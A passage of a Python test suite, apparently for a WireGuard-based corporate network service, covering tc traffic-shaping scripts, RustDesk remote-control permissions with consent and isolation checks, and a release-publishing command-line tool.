        conn = db.connect(); conn.execute("UPDATE companies SET full_lan=1 WHERE id=?", (cid,)); conn.commit(); conn.close()
        r = ctx.register("rival", name="R")
        self._report(ctx, r, [], 0); TestDirectLan._seen(r, self.OFFICE_B)
        assert self._me(ctx, a)["direct_wan"] == [] and self._me(ctx, r)["direct_wan"] == []

    def test_pending_device_gets_nothing(self, ctx):
        _, (a, b) = self._pcs(ctx)
        from app import db
        conn = db.connect(); conn.execute("UPDATE devices SET is_approved=0 WHERE id=?", (a["device_id"],)); conn.commit(); conn.close()
        assert self._me(ctx, a)["direct_wan"] == [] and self._me(ctx, b)["direct_wan"] == []


class TestSpeedLimit:
    """Скорость через сервер: на компанию (суперадмин) и на ПК (суперадмин и кабинет)."""

    def test_script_company_and_devices(self, monkeypatch):
        from app import wg
        script = wg.shaping_script([{"subnet": 3, "mbit": 20, "devices": [(5, 50), (7, 4)]},
                                    {"subnet": 12, "mbit": 0, "devices": [(2, 10)]}])
        assert script[:4] == ["qdisc add dev wg0 root handle 1: htb default fffe",
                              "class add dev wg0 parent 1: classid 1:fffe htb rate 10gbit quantum 1514",
                              "qdisc add dev wg0 parent 1:fffe fq_codel",
                              "qdisc add dev wg0 handle ffff: ingress"]
        text = "\n".join(script)
        # компания 3: 20 Мбит/с на всех, гарантия поровну между тремя классами (два ПК и остальные)
        assert "class add dev wg0 parent 1: classid 1:3 htb rate 20mbit ceil 20mbit" in text
        assert "classid 1:301 htb rate 6666kbit ceil 20mbit" in text
        assert "match ip dst 10.66.3.0/24 flowid 1:301" in text
        # ПК 10.66.3.5 просил 50 — больше компании не бывает; 10.66.3.7 — 4
        assert "parent 1:3 classid 1:305 htb rate 6666kbit ceil 20mbit" in text
        assert "parent 1:3 classid 1:307 htb rate 6666kbit ceil 4mbit" in text
        assert "prio 1 u32 match ip dst 10.66.3.7/32 flowid 1:307" in text
        assert "parent ffff: protocol ip prio 1 u32 match ip src 10.66.3.7/32 police rate 4mbit burst 65536b drop" in text
        assert "src 10.66.3.5/32 police rate 20mbit" in text
        # компания 12 без общего ограничения: ПК .2 — сам по себе, classid в hex (12 = 0xc)
        assert "parent 1: classid 1:c02 htb rate 10mbit ceil 10mbit" in text
        assert "10.66.12.0/24" not in text
        assert wg.shaping_script([]) == []

    def test_apply_only_on_change_and_clears_on_failure(self, monkeypatch):
        from app import wg
        calls = []

        def run(args, input=None, check=True):
            calls.append(" ".join(args))
            if args[:2] == ["tc", "-batch"] and "fail" in calls:
                raise RuntimeError("RTNETLINK answers: No such file or directory")
            return "qdisc htb 1: root" if args[1:3] == ["qdisc", "show"] else ""
        monkeypatch.setattr(wg, "DRY_RUN", False)
        monkeypatch.setattr(wg, "run", run)
        monkeypatch.setattr(wg, "_shaping_applied", None)
        limits = [{"subnet": 1, "mbit": 5, "devices": []}]
        wg.apply_shaping(limits)
        assert calls == ["tc qdisc del dev wg0 root", "tc qdisc del dev wg0 ingress", "tc -batch -"]
        calls.clear(); wg.apply_shaping(limits)
        assert calls == ["tc qdisc show dev wg0"]                          # ничего не изменилось
        calls.clear(); wg.apply_shaping([])
        assert calls == ["tc qdisc del dev wg0 root", "tc qdisc del dev wg0 ingress"]
        calls.clear(); wg.apply_shaping([])
        assert calls == []                                                  # без ограничений tc не трогаем
        calls.append("fail"); wg.apply_shaping(limits)
        assert calls.count("tc -batch -") == 3                              # полный, без fq_codel, без police
        assert calls[-2:] == ["tc qdisc del dev wg0 root", "tc qdisc del dev wg0 ingress"]   # лучше без, чем наполовину
        assert wg._shaping_applied is None

    def test_kernel_without_modules_gets_reduced_variant(self, monkeypatch, caplog):
        """Нет fq_codel и act_police — ограничение приёма и компании всё равно работает (и это видно в журнале)."""
        from app import wg
        sent = []

        def run(args, input=None, check=True):
            if args[:2] == ["tc", "-batch"]:
                sent.append(input)
                if "fq_codel" in input or "police" in input:
                    raise RuntimeError("Error: Specified qdisc kind is unknown.")
            return ""
        monkeypatch.setattr(wg, "DRY_RUN", False)
        monkeypatch.setattr(wg, "run", run)
        monkeypatch.setattr(wg, "_shaping_applied", None)
        wg.apply_shaping([{"subnet": 1, "mbit": 5, "devices": [(2, 1)]}])
        assert len(sent) == 3 and "police" not in sent[-1] and "fq_codel" not in sent[-1]
        assert "1:102 htb rate" in sent[-1] and wg._shaping_applied
        assert "без ограничения отправки" in caplog.text

    def test_build_from_database(self, ctx, net):
        from app import db
        c1 = ctx.company("fast"); ctx.company("slow"); ctx.company("off")
        a, b, c = (ctx.register("fast", name=n) for n in ("A", "B", "C"))
        s1 = ctx.register("slow", name="S")
        conn = db.connect()
        conn.execute("UPDATE companies SET speed_limit=30 WHERE login='slow'")
        conn.execute("UPDATE companies SET speed_limit=7, is_active=0 WHERE login='off'")
        conn.execute("UPDATE devices SET speed_limit=5 WHERE id IN (?,?,?)", (a["device_id"], b["device_id"], c["device_id"]))
        conn.execute("UPDATE devices SET is_blocked=1 WHERE id=?", (b["device_id"],))        # не в сети — не нужен
        conn.execute("UPDATE devices SET token_hash=NULL WHERE id=?", (c["device_id"],))     # вышел из сети
        conn.commit()
        from app import services
        limits = services.build_shaping(conn)
        conn.close()
        sub = {c["subnet"]: c for c in limits}
        host = lambda d: int(d["ip"].rsplit(".", 1)[1])
        assert sub[1] == {"subnet": 1, "mbit": 0, "devices": [(host(a), 5)]}
        assert sub[2] == {"subnet": 2, "mbit": 30, "devices": []}
        assert 3 not in sub                                                  # компания отключена
        assert s1["ip"].startswith("10.66.2.") and c1

    def test_admin_sets_company_speed(self, ctx, net):
        cid = ctx.company("firma")
        url = f"/admin/companies/{cid}/update"
        form = {"name": "Firma", "max_devices": 20, "is_active": "1"}
        r = ctx.admin.post(url, data=form | {"speed_limit": "25"})
        assert "Сохранено" in r.text and "25 Мбит/с" in r.text
        assert net["shaping"] == [{"subnet": 1, "mbit": 25, "devices": []}]
        assert "25 Мбит/с" in ctx.cabinet("firma").get("/cabinet").text           # компания видит, но не меняет
        r = ctx.admin.post(url, data=form)                                         # поля нет — не сбрасываем
        assert net["shaping"][0]["mbit"] == 25
        for bad in ("-1", "abc", "10001", "2.5"):
            r = ctx.admin.post(url, data=form | {"speed_limit": bad})
            assert "Скорость" in r.text and net["shaping"][0]["mbit"] == 25, bad
        ctx.admin.post(url, data=form | {"speed_limit": "0"})
        assert net["shaping"] == []
        assert "speed=25" in ctx.admin.get(f"/admin/companies/{cid}").text            # журнал

    def test_cabinet_and_admin_set_device_speed(self, ctx, net):
        cid = ctx.company("firma"); ctx.company("rival")
        d = ctx.register("firma", name="Kassa")
        cab = ctx.cabinet("firma")
        r = cab.post(f"/cabinet/devices/{d['device_id']}/speed", data={"value": "8"})
        assert "Kassa: скорость через сервер до 8 Мбит/с" in r.text
        assert net["shaping"] == [{"subnet": 1, "mbit": 0, "devices": [(2, 8)]}]
        assert 'name="value" value="8"' in r.text
        r = cab.post(f"/cabinet/devices/{d['device_id']}/speed", data={"value": "fast"})
        assert "Скорость" in r.text and net["shaping"][0]["devices"] == [(2, 8)]
        r = ctx.admin.post(f"/admin/companies/{cid}/devices/{d['device_id']}/speed", data={"value": ""})
        assert "без ограничения" in r.text and net["shaping"] == []
        r = ctx.cabinet("rival").post(f"/cabinet/devices/{d['device_id']}/speed", data={"value": "1"})
        assert "не найдено" in r.text and net["shaping"] == []

    @pytest.mark.skipif(not __import__("shutil").which("tc") or __import__("os").geteuid() != 0,
                        reason="нужны root и tc")
    def test_script_accepted_by_real_tc(self):
        """Команды принимает настоящий tc: в отдельном network namespace на интерфейсе wg0 (tun, как у wireguard-go)."""
        import subprocess
        from app import wg
        ns = "rxtc-test"
        sh = lambda c, check=True: subprocess.run(c, shell=True, capture_output=True, text=True, check=check)
        if sh(f"ip netns add {ns}", check=False).returncode != 0:
            pytest.skip("network namespace недоступен")
        try:
            sh(f"ip netns exec {ns} ip tuntap add wg0 mode tun && ip netns exec {ns} ip link set wg0 up")
            limits = [{"subnet": 3, "mbit": 20, "devices": [(5, 50), (7, 4)]},
                      {"subnet": 254, "mbit": 0, "devices": [(254, 1)]}]
            applied = None
            for fair, police, _ in wg.SHAPING_VARIANTS:     # ядро песочницы может не знать fq_codel / police
                sh(f"ip netns exec {ns} tc qdisc del dev wg0 root; ip netns exec {ns} tc qdisc del dev wg0 ingress",
                   check=False)
                script = wg.shaping_script(limits, fair, police)
                r = subprocess.run(["ip", "netns", "exec", ns, "tc", "-batch", "-"], input="\n".join(script) + "\n",
                                   capture_output=True, text=True)
                if r.returncode == 0:
                    applied = (fair, police)
                    break
                assert "unknown" in r.stderr or "module" in r.stderr, r.stderr   # только нехватка модуля
            assert applied, r.stderr
            classes = sh(f"ip netns exec {ns} tc class show dev wg0").stdout
            for cls in ("1:3 ", "1:301", "1:305", "1:307", "1:fefe", "1:fffe"):
                assert f"class htb {cls}" in classes, cls
            assert sh(f"ip netns exec {ns} tc filter show dev wg0 parent 1:").stdout.count("flowid") == 4   # 3 ПК + компания 3
            if applied[1]:
                filters = sh(f"ip netns exec {ns} tc filter show dev wg0 parent ffff:").stdout
                assert filters.count("police") == 3
        finally:
            sh(f"ip netns del {ns}", check=False)


class TestRadminServerFlag:
    """ПК сообщает, стоит ли на нём Radmin Server; другие ПК компании видят это в /api/peers."""

    def test_reported_and_shown_to_peers(self, ctx):
        ctx.company("firma")
        a, b = ctx.register("firma", name="A"), ctx.register("firma", name="B")
        peers = lambda pc: {p["name"]: p for p in ctx.api.get("/api/peers", headers=ctx.h(pc["token"])).json()["peers"]}
        assert peers(a)["B"]["radmin_server"] is False                     # пока не сообщил — нет
        ctx.api.post("/api/heartbeat", headers=ctx.h(b["token"]), json={"client_version": "1.0.12", "radmin_server": True})
        assert peers(a)["B"]["radmin_server"] is True
        ctx.api.post("/api/heartbeat", headers=ctx.h(b["token"]), json={"client_version": "1.0.11"})   # старый клиент
        assert peers(a)["B"]["radmin_server"] is True                      # поля нет — значение не трогаем
        ctx.api.post("/api/heartbeat", headers=ctx.h(b["token"]), json={"radmin_server": False})       # удалили
        assert peers(a)["B"]["radmin_server"] is False

    def test_not_on_public_pages(self, ctx):
        r = ctx.TestClient(ctx.app).get("/")
        assert r.status_code == 200 and "Radmin" not in r.text


class TestRemoteControl:
    """Удалённое управление через RustDesk: режим в кабинете, пароль ПК, разрешение на подключение и журнал."""

    @staticmethod
    def _online(*devs):
        import time as _t
        from app import db
        conn = db.connect()
        now = int(_t.time())
        for d in devs:
            conn.execute("UPDATE devices SET last_handshake=?, last_rx_at=? WHERE id=?", (now, now, d["device_id"]))
        conn.commit()
        conn.close()

    def _setup(self, ctx, mode="auto"):
        ctx.company("firma")
        a, b = ctx.register("firma", name="A"), ctx.register("firma", name="B")
        cab = ctx.cabinet("firma")
        r = cab.post("/cabinet/settings", data={"share_name": "share", "share_ports": "445", "remote_mode": mode})
        assert "Настройки сохранены" in r.text
        r = cab.post(f"/cabinet/devices/{a['device_id']}/control_on")   # A может управлять другими
        assert "может управлять" in r.text
        return a, b, cab

    def _me(self, ctx, pc):
        return ctx.api.get("/api/me", headers=ctx.h(pc["token"])).json()

    def test_off_by_default(self, ctx, net):
        ctx.company("firma")
        a, b = ctx.register("firma", name="A"), ctx.register("firma", name="B")
        assert self._me(ctx, a)["remote"] == {"mode": "off", "port": 21118, "rotate": False, "can_control": False,
                                              "allowed": []}
        r = ctx.api.post("/api/remote/connect", headers=ctx.h(a["token"]), json={"to": b["device_id"]})
        assert r.status_code == 403 and "выключено" in r.json()["detail"]
        assert not any("21118" in rule for rule in net["rules"])
        ctx.api.post("/api/heartbeat", headers=ctx.h(b["token"]), json={"remote_ok": True})
        peers = ctx.api.get("/api/peers", headers=ctx.h(a["token"])).json()["peers"]
        assert all(p["remote"] is False for p in peers)       # выключено — меню RustDesk нет ни у кого

    def test_auto_password_flow(self, ctx, net):
        a, b, cab = self._setup(ctx)
        # порт RustDesk открыт только с ПК, которому разрешено управлять
        assert [r for r in net["rules"] if "21118" in r] == \
            [f"-A RETIX_FWD -s {a['ip']}/32 -d 10.66.1.0/24 -p tcp --dport 21118 -j ACCEPT"]
        assert self._me(ctx, b)["remote"]["allowed"] == [a["ip"]]            # RustDesk на B пускает только A
        assert self._me(ctx, a)["remote"]["can_control"] is True
        assert self._me(ctx, b)["remote"]["can_control"] is False
        assert self._me(ctx, b)["remote"]["rotate"] is True                # пароля ещё нет — ПК его придумает
        r = ctx.api.post("/api/remote/connect", headers=ctx.h(a["token"]), json={"to": b["device_id"]})
        assert r.status_code == 409 and "не готово" in r.json()["detail"]

        ctx.api.post("/api/heartbeat", headers=ctx.h(b["token"]), json={"remote_ok": True})
        assert ctx.api.post("/api/remote/password", headers=ctx.h(b["token"]),
                            json={"password": "Secret1234567890"}).json() == {"ok": True}
        assert self._me(ctx, b)["remote"]["rotate"] is False
        peers = {p["name"]: p for p in ctx.api.get("/api/peers", headers=ctx.h(a["token"])).json()["peers"]}
        assert peers["B"]["remote"] is True

        r = ctx.api.post("/api/remote/connect", headers=ctx.h(a["token"]), json={"to": b["device_id"]})
        assert r.status_code == 409 and "не в сети" in r.json()["detail"]
        self._online(b)
        r = ctx.api.post("/api/remote/connect", headers=ctx.h(a["token"]), json={"to": b["device_id"]})
        assert r.status_code == 200, r.text
        assert r.json() == {"ip": b["ip"], "port": 21118, "mode": "auto", "password": "Secret1234567890", "name": "B"}

        # пароль выдан — через пару минут (после сеанса) ПК его сменит
        assert self._me(ctx, b)["remote"]["rotate"] is False
        from app import db
        conn = db.connect()
        conn.execute("UPDATE devices SET remote_used_at=remote_used_at-200 WHERE id=?", (b["device_id"],))
        row = conn.execute("SELECT remote_pw FROM devices WHERE id=?", (b["device_id"],)).fetchone()
        conn.commit()
        conn.close()
        assert "Secret1234567890" not in row["remote_pw"]             # в базе — только зашифрованным
        assert self._me(ctx, b)["remote"]["rotate"] is True
        ctx.api.post("/api/remote/password", headers=ctx.h(b["token"]), json={"password": "Another123456789"})
        assert self._me(ctx, b)["remote"]["rotate"] is False

        page = cab.get("/cabinet").text
        assert "Журнал удалённого управления" in page and f"A {a['ip']} → B {b['ip']}" in page

    def test_ask_mode_has_no_password(self, ctx):
        a, b, _ = self._setup(ctx, mode="ask")
        ctx.api.post("/api/heartbeat", headers=ctx.h(b["token"]), json={"remote_ok": True})
        self._online(b)
        assert self._me(ctx, b)["remote"]["mode"] == "ask" and self._me(ctx, b)["remote"]["rotate"] is False
        r = ctx.api.post("/api/remote/connect", headers=ctx.h(a["token"]), json={"to": b["device_id"], "kind": "files"})
        assert r.status_code == 200 and r.json()["mode"] == "ask" and r.json()["password"] == ""

    def test_isolation_and_access(self, ctx):
        a, b, _ = self._setup(ctx)
        ctx.api.post("/api/heartbeat", headers=ctx.h(b["token"]), json={"remote_ok": True})
        ctx.api.post("/api/remote/password", headers=ctx.h(b["token"]), json={"password": "Secret1234567890"})
        self._online(b)
        ctx.company("other")
        x = ctx.register("other", name="X")
        cab2 = ctx.cabinet("other")
        cab2.post("/cabinet/settings", data={"share_name": "share", "share_ports": "445", "remote_mode": "auto"})
        r = ctx.api.post("/api/remote/connect", headers=ctx.h(x["token"]), json={"to": b["device_id"]})
        assert r.status_code == 403 and "не разрешил" in r.json()["detail"]   # без права «управляет» — нет
        cab2.post(f"/cabinet/devices/{x['device_id']}/control_on")
        r = ctx.api.post("/api/remote/connect", headers=ctx.h(x["token"]), json={"to": b["device_id"]})
        assert r.status_code == 404                                   # ПК чужой компании — как будто его нет
        r = ctx.api.post("/api/remote/connect", headers=ctx.h(a["token"]), json={"to": a["device_id"]})
        assert r.status_code == 404                                   # к самому себе — нет
        cab = ctx.cabinet("firma")
        cab.post(f"/cabinet/devices/{a['device_id']}/peers_off")
        r = ctx.api.post("/api/remote/connect", headers=ctx.h(a["token"]), json={"to": b["device_id"]})
        assert r.status_code == 403                                   # нет доступа к другим ПК — нет и управления
        cab.post(f"/cabinet/devices/{b['device_id']}/block")
        cab.post(f"/cabinet/devices/{a['device_id']}/peers_on")
        r = ctx.api.post("/api/remote/connect", headers=ctx.h(a["token"]), json={"to": b["device_id"]})
        assert r.status_code == 404                                   # заблокированный ПК

    def test_bad_values(self, ctx):
        a, b, cab = self._setup(ctx)
        for pw in ("short", "with space 12345", "кириллица123456"):
            r = ctx.api.post("/api/remote/password", headers=ctx.h(b["token"]), json={"password": pw})
            assert r.status_code in (400, 422), pw
        r = ctx.api.post("/api/remote/connect", headers=ctx.h(a["token"]), json={"to": b["device_id"], "kind": "x"})
        assert r.status_code == 422
        r = cab.post("/cabinet/settings", data={"share_name": "share", "share_ports": "445", "remote_mode": "evil"})
        assert "Неизвестный режим" in r.text
        # форма без поля (старая страница) режим не меняет
        cab.post("/cabinet/settings", data={"share_name": "share", "share_ports": "445"})
        assert self._me(ctx, a)["remote"]["mode"] == "auto"

    def test_full_lan_needs_no_extra_rule(self, ctx, net):
        a, b, cab = self._setup(ctx)
        cab.post("/cabinet/settings", data={"share_name": "share", "share_ports": "445", "full_lan": "1",
                                            "remote_mode": "auto"})
        assert not any("21118" in rule for rule in net["rules"])      # «любой трафик» и так пропускает

    def test_admin_sets_mode(self, ctx):
        cid = ctx.company("firma")
        r = ctx.admin.post(f"/admin/companies/{cid}/update", data={"name": "firma", "max_devices": 20, "is_active": "1",
                                                                   "remote_mode": "ask"})
        assert "Сохранено" in r.text and "с согласием пользователя" in r.text
        a = ctx.register("firma", name="A")
        assert self._me(ctx, a)["remote"]["mode"] == "ask"
        r = ctx.admin.post(f"/admin/companies/{cid}/update", data={"name": "firma", "max_devices": 20, "is_active": "1"})
        assert self._me(ctx, a)["remote"]["mode"] == "ask"            # без поля — не меняется

    def test_secret_key_change_asks_new_password(self, ctx, monkeypatch):
        a, b, _ = self._setup(ctx)
        ctx.api.post("/api/remote/password", headers=ctx.h(b["token"]), json={"password": "Secret1234567890"})
        from app import services
        monkeypatch.setattr(services, "SECRET_KEY", "другой ключ")
        assert self._me(ctx, b)["remote"]["rotate"] is True            # старый не расшифровать — ПК придумает новый


class TestRemoteRights:
    """Права на удалённое управление: кто управляет (кабинет), можно ли управлять ПК (кабинет, только строже),
    выбор пользователя ПК (ещё строже, свой пароль)."""

    def _setup(self, ctx, mode="auto"):
        ctx.company("firma")
        a, b = ctx.register("firma", name="A"), ctx.register("firma", name="B")
        cab = ctx.cabinet("firma")
        cab.post("/cabinet/settings", data={"share_name": "share", "share_ports": "445", "remote_mode": mode})
        for pc in (a, b):
            ctx.api.post("/api/heartbeat", headers=ctx.h(pc["token"]), json={"remote_ok": True})
        ctx.api.post("/api/remote/password", headers=ctx.h(b["token"]), json={"password": "Secret1234567890"})
        TestRemoteControl._online(a, b)
        return a, b, cab

    def connect(self, ctx, frm, to):
        return ctx.api.post("/api/remote/connect", headers=ctx.h(frm["token"]), json={"to": to["device_id"]})

    def peers(self, ctx, pc):
        return {p["name"]: p for p in ctx.api.get("/api/peers", headers=ctx.h(pc["token"])).json()["peers"]}

    def test_nobody_controls_by_default(self, ctx, net):
        a, b, cab = self._setup(ctx)
        assert self.connect(ctx, a, b).status_code == 403
        assert self.peers(ctx, a)["B"]["remote"] is False                 # меню RustDesk нет
        assert ctx.api.get("/api/me", headers=ctx.h(b["token"])).json()["remote"]["allowed"] == []
        assert not any("21118" in r for r in net["rules"])
        assert "управляет: нет" in cab.get("/cabinet").text

    def test_admin_restricts_target(self, ctx):
        a, b, cab = self._setup(ctx)
        cab.post(f"/cabinet/devices/{a['device_id']}/control_on")
        assert self.connect(ctx, a, b).json()["password"] == "Secret1234567890"
        cab.post(f"/cabinet/devices/{b['device_id']}/remote_access", data={"value": "ask"})
        r = self.connect(ctx, a, b).json()
        assert r["mode"] == "ask" and r["password"] == ""                 # только с согласием — пароля не даём
        assert ctx.api.get("/api/me", headers=ctx.h(b["token"])).json()["remote"]["mode"] == "ask"
        cab.post(f"/cabinet/devices/{b['device_id']}/remote_access", data={"value": "off"})
        assert self.connect(ctx, a, b).status_code == 403
        assert self.peers(ctx, a)["B"]["remote"] is False
        r = cab.post(f"/cabinet/devices/{b['device_id']}/remote_access", data={"value": "auto"})
        assert "Неизвестный режим" in r.text                              # «без согласия» для ПК не выдать
        cab.post(f"/cabinet/devices/{a['device_id']}/control_off")
        cab.post(f"/cabinet/devices/{b['device_id']}/remote_access", data={"value": "company"})
        assert self.connect(ctx, a, b).status_code == 403

    def test_user_choice_on_target(self, ctx):
        a, b, cab = self._setup(ctx)
        cab.post(f"/cabinet/devices/{a['device_id']}/control_on")
        hb = lambda local: ctx.api.post("/api/heartbeat", headers=ctx.h(b["token"]), json={"remote_local": local})
        hb("own")                                                            # по своему паролю
        r = self.connect(ctx, a, b).json()
        assert r["mode"] == "own" and r["password"] == ""                  # сервер пароль пользователя не знает
        assert self.peers(ctx, a)["B"]["remote_mode"] == "own"
        hb("off")
        r = self.connect(ctx, a, b)
        assert r.status_code == 403 and "пользователь" in r.json()["detail"]
        hb("")                                                               # снова как администратор
        me = ctx.api.get("/api/me", headers=ctx.h(b["token"])).json()["remote"]
        assert me["rotate"] is True              # прежний пароль сервера стёрт — ПК придумает новый
        assert self.connect(ctx, a, b).status_code == 409
        hb("ask")
        assert "сейчас: с согласием (выбор пользователя)" in cab.get("/cabinet").text
        assert ctx.api.post("/api/heartbeat", headers=ctx.h(b["token"]), json={"remote_local": "evil"}).status_code == 422

    def test_user_cannot_loosen_admin(self, ctx):
        a, b, cab = self._setup(ctx, mode="ask")
        cab.post(f"/cabinet/devices/{a['device_id']}/control_on")
        ctx.api.post("/api/heartbeat", headers=ctx.h(b["token"]), json={"remote_local": "own"})
        assert self.connect(ctx, a, b).json()["mode"] == "own"           # свой пароль — его собственное согласие
        cab.post(f"/cabinet/devices/{b['device_id']}/remote_access", data={"value": "off"})
        assert self.connect(ctx, a, b).status_code == 403               # администратор выключил — и свой пароль не поможет


class TestPublishCli:
    """./publish.sh (python -m app.publish): версия клиента публикуется прямо на сервере."""

    def test_publish_local_file_now_and_draft(self, ctx, tmp_path):
        from app import publish
        from conftest import fake_setup
        f = tmp_path / "RetixHub_Setup_1.0.40.exe"; f.write_bytes(fake_setup("1.0.40"))
        assert publish.main(["--file", str(f), "--notes", "Новое меню"]) == 0
        from app import db
        conn = db.connect()
        rel = conn.execute("SELECT version, published, notes, created_by FROM app_releases").fetchone()
        conn.close()
        assert tuple(rel) == ("1.0.40", 1, "Новое меню", "publish.sh")
        assert publish.main(["--file", str(f)]) == 1                        # та же версия второй раз — нет
        d = tmp_path / "RetixHub_Setup_1.0.41.exe"; d.write_bytes(fake_setup("1.0.41"))
        assert publish.main(["--file", str(d), "--draft"]) == 0
        page = ctx.admin.get("/admin/updates").text
        assert "1.0.41" in page and "черновик" in page
        bad = tmp_path / "other.exe"; bad.write_bytes(fake_setup("1.0.42", product="Чужая программа"))
        assert publish.main(["--file", str(bad)]) == 1                      # чужой exe не примется

    def test_publish_from_github_release(self, ctx, monkeypatch):
        from app import publish
        from conftest import fake_setup
        body = "## Что нового\n\n- Меню «Управление»\n- Ремонт RustDesk\n\n---\n\nУстановщик клиента Retix Hub…"
        monkeypatch.setattr(publish, "release_info", lambda version, token: {
            "version": version or "1.0.43", "asset_id": 7, "name": "RetixHub_Setup_1.0.43.exe", "size": 1,
            "notes": publish.release_notes(body)})
        monkeypatch.setattr(publish, "download", lambda asset_id, dest, token: open(dest, "wb").write(fake_setup("1.0.43")))
        assert publish.main([]) == 0
        from app import db
        conn = db.connect()
        rel = conn.execute("SELECT version, published, notes FROM app_releases").fetchone()
        conn.close()
        assert tuple(rel) == ("1.0.43", 1, "- Меню «Управление»\n- Ремонт RustDesk")
        assert not [n for n in os.listdir(os.path.join(os.environ["DATA_DIR"], "updates")) if n.startswith("publish_")]

    def test_bad_version_argument(self, ctx):
        from app import publish
        with pytest.raises(SystemExit):
            publish.main(["1.x"])
